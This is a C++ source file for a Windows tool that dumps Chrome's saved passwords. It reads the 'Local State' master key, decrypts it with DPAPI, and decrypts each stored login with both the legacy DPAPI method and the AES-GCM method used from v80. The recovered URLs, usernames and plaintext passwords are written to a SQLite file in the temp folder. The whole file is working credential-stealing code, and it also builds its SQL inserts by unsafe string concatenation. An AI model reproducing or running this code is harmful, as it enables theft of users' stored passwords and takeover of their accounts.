#include "Dumper.h"

string Dumper::decryptPassword(BYTE* ciphertext)
{
	string plainPassword;

	//decrypt using method before chrome v80
	try
	{
		string data{ (char*)ciphertext };
		DATA_BLOB in{ data.length(), ciphertext };
		DATA_BLOB out;
		if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) return string{ (char*)out.pbData };
	}
	catch (exception e)
	{
		cerr << "Error at pre-v80 method: " << e.what();
	}

	//decrypt using method from chrome v80 onwards
	try
	{
		CryptoPP::SecByteBlock key(Dumper::masterKey.length());
		CryptoPP::SecByteBlock iv(12);
		memcpy(key, Dumper::masterKey.c_str(), Dumper::masterKey.length());
		memcpy(iv, ciphertext + 3, 12);
		CryptoPP::GCM<CryptoPP::AES>::Decryption gcmDecrypt;
		gcmDecrypt.SetKeyWithIV(key, 32, iv, 12);
		string cipher = string((char*)ciphertext).substr(15);
		CryptoPP::AuthenticatedDecryptionFilter df(gcmDecrypt, new CryptoPP::StringSink(plainPassword));
		CryptoPP::StringSource source(cipher, true, new CryptoPP::Redirector(df));
		return plainPassword;
	}
	catch (exception& e)
	{
		//cerr << e.what() << endl;
		return e.what();
	}

}

int Dumper::handlePasswords(void* outdb, int argc, char** argv, char** azColName)
{
	//dump passwords on a database and save on local machine
	string plainPasswd = Dumper::decryptPassword((BYTE*)argv[2]);
	string query = "INSERT INTO logins VALUES(\'" + (string)argv[0] + "\', \'" + (string)argv[1] + "\', \'" + plainPasswd + "\')";
	char* error;
	if (sqlite3_exec((sqlite3*)outdb, query.c_str(), NULL, 0, &error) != SQLITE_OK)
	{
		cerr << "Can't write to output database\n";
		cerr << "Error: " << error << endl;
		return 0x69;
	}
	return 0;
}

const string Dumper::chromePath = getenv("USERPROFILE") + string("\\AppData\\Local\\Google\\Chrome\\");
string Dumper::masterKey = "";

string Dumper::readPasswords()
{
	string loginDataPath = Dumper::chromePath + string("User Data\\Default\\Login Data");
	char tempPath[MAX_PATH];
	GetTempPathA(MAX_PATH, tempPath);

	//Copy the file to temp folder so that it can be opened while Chrome is running
	string tempLoginData = (string)tempPath + "Login Data";
	if (!CopyFile(loginDataPath.c_str(), tempLoginData.c_str(), false))
	{
		cerr << "Error: Can't copy file to Temp folder\n";
		exit(GetLastError());
	}

	//open a new database to write dumped passwords
	char* error;
	sqlite3* outdb;
	string outFilePath = tempPath + (string)"output.db";
	sqlite3_open_v2(outFilePath.c_str(), &outdb, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE, NULL);
	string query = "DROP TABLE IF EXISTS logins";
	//remove data from previous run
	if (sqlite3_exec(outdb, query.c_str(), NULL, 0, &error) != SQLITE_OK)
	{
		cout << "Error: " << error << endl;
		exit(0x69);
	}

	query = "CREATE TABLE logins (url TEXT, username TEXT, password TEXT)";
	if (sqlite3_exec(outdb, query.c_str(), NULL, 0, &error) != SQLITE_OK)
	{
		cout << "Error: " << error << endl;
		exit(0x69);
	}

	sqlite3* db;
	//read the database contains login data
	if (sqlite3_open(tempLoginData.c_str(), &db))
	{
		cerr << "SQLITE3 error: Can't open database\n";
		exit(sqlite3_errcode(db));
	}

	query = "SELECT origin_url, username_value, password_value FROM logins";
	if (sqlite3_exec(db, query.c_str(), Dumper::handlePasswords, outdb, &error) != SQLITE_OK)
	{
		cout << "SQLITE3 error: " << error << endl;
		exit(0x69);
	}

	DeleteFileA(tempLoginData.c_str());
	return outFilePath;


}

void Dumper::getMasterKey()
{
	string localStatePath = Dumper::chromePath + string("User Data\\Local State");
	char tempPath[MAX_PATH];
	GetTempPathA(MAX_PATH, tempPath);
	string tempLocalState = (string)tempPath + "Local State";
	//Copy the file to temp folder so that it can be opened while Chrome is running
	if (!CopyFile(localStatePath.c_str(), tempLocalState.c_str(), false))
	{
		cerr << "Error: Can't copy file to Temp folder\n";
		exit(GetLastError());
	}
	ifstream ifs(tempLocalState.c_str());
	nlohmann::json jf = nlohmann::json::parse(ifs);
	string encryptedKey = jf["os_crypt"]["encrypted_key"].get<string>();		//get the encrypted key
	string decodedb64Key;
	macaron::Base64::Decode(encryptedKey, decodedb64Key);						//decoded base64
	decodedb64Key = decodedb64Key.substr(5);									//omit first 5 chars(a.k.a signature bytes that chrome added)

	//decrypt the master key
	DATA_BLOB input{ decodedb64Key.length(), (BYTE*)decodedb64Key.c_str() };
	DATA_BLOB output;
	if (!CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output))
	{
		cerr << "Unable to decrypt the master key\n";
		exit(GetLastError());
	}
	Dumper::masterKey = (char*)output.pbData;
	ifs.close();
	DeleteFileA(tempLocalState.c_str());
}

//driver function of the dumper class
string Dumper::dumpPassword()
{
	Dumper::getMasterKey();
	return Dumper::readPasswords();
}